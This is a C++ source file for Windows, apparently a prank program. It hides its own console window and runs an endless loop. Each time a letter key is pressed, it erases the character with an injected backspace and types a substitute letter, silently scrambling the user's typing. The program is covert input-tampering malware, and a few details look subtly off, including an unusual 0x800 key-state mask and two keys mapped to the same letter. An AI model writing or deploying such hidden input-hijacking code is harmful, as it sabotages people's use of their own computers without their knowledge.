#include <iostream>
#include <windows.h>

using namespace std;

void KeyPress(char key){
	INPUT ip;
 
	// Set up a generic keyboard event.
	ip.type = INPUT_KEYBOARD;
	ip.ki.wScan = 0; // hardware scan code for key
	ip.ki.time = 0;
	ip.ki.dwExtraInfo = 0;
	
	// Press the "A" key
	ip.ki.wVk = key; // virtual-key code for the key
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));
	
	// Release the key
	ip.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
	SendInput(1, &ip, sizeof(INPUT));
}

void SwitchKeys(char key1,char key2){
	bool pressed=false;
	if(GetKeyState(key1)&0x800){
		KeyPress(VK_BACK);
		KeyPress(key2);
		pressed=true;
		while(pressed==true){
			if(GetAsyncKeyState(key1)&0x8000){
				Sleep(1);
			}else{
				pressed=false;
			}
		}
	}
}

int main(){
	ShowWindow(GetConsoleWindow(),SW_HIDE);
	int loop = 1;
	bool pressed=false;
	while(loop==1){
		SwitchKeys(0x41,0x55);
		SwitchKeys(0x42,0x54);
		SwitchKeys(0x43,0x59);
		SwitchKeys(0x44,0x51);
		SwitchKeys(0x45,0x53);
		SwitchKeys(0x46,0x52);
		SwitchKeys(0x47,0x48);
		SwitchKeys(0x48,0x5A);
		SwitchKeys(0x49,0x41);
		SwitchKeys(0x4A,0x58);
		SwitchKeys(0x4B,0x56);
		SwitchKeys(0x4C,0x49);
		SwitchKeys(0x4D,0x42);
		SwitchKeys(0x4E,0x4A);
		SwitchKeys(0x4F,0x57);
		SwitchKeys(0x50,0x46);
		SwitchKeys(0x51,0x50);
		SwitchKeys(0x52,0x4F);
		SwitchKeys(0x53,0x45);
		SwitchKeys(0x54,0x4B);
		SwitchKeys(0x55,0x4D);
		SwitchKeys(0x56,0x47);
		SwitchKeys(0x57,0x4D);
		SwitchKeys(0x58,0x4C);
		SwitchKeys(0x59,0x43);
		SwitchKeys(0x5A,0x44);
	}
 }
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
